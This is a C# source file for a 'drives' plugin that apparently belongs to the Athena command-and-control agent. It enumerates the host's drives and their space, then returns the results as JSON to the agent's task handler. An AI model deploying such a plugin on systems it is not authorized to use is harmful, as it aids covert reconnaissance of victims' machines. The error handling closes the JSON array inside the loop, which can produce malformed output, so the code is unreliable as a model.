using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Athena.Commands;
using Athena.Commands.Models;
using Athena.Models.Comms.Tasks;

namespace Plugins
{
    public class Drives : IPlugin
    {
        public string Name => "drives";

        public bool Interactive => false;

        public void Interact(InteractiveMessage message)
        {
            throw new NotImplementedException();
        }

        public bool IsRunning()
        {
            throw new NotImplementedException();
        }

        public void Start(Dictionary<string, string> args)
        {
            StringBuilder output = new StringBuilder();
            output.Append("[");
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            foreach (DriveInfo d in allDrives)
            {
                try
                {
                    output.Append($"{{\"DriveName\":\"{d.Name.Replace(@"\", @"\\")}\",\"DriveType\":\"{d.DriveType}\",\"FreeSpace\":\"{(d.TotalFreeSpace/1000000000).ToString()}\",\"TotalSpace\":\"{(d.TotalSize/ 1000000000).ToString()}\"}},");
                }
                catch (IOException e)
                {
                    output.Append($"{{\"DriveName\":\"{d.Name.Replace(@"\", @"\\")}\",\"DriveType\":\"{e.Message.Split(":")[0].TrimEnd(' ')}\",\"FreeSpace\":\"\",\"TotalSpace\":\"\"}},");
                }
                catch (Exception e)
                {
                    output.Append($"{{\"DriveName\":\"{d.Name.Replace(@"\", @"\\")}\",\"DriveType\":\"{e.Message.Split(":")[0].TrimEnd(' ')}\",\"FreeSpace\":\"\",\"TotalSpace\":\"\"}},");

                    output.Remove(output.Length - 1, 1);
                    output.Append("]");
                }
            }
            output.Remove(output.Length - 1, 1);
            output.Append("]");

            TaskResponseHandler.Write(output.ToString(), args["task-id"], true);
        }

        public void Stop(string task_id)
        {
            throw new NotImplementedException();
        }
    }
}
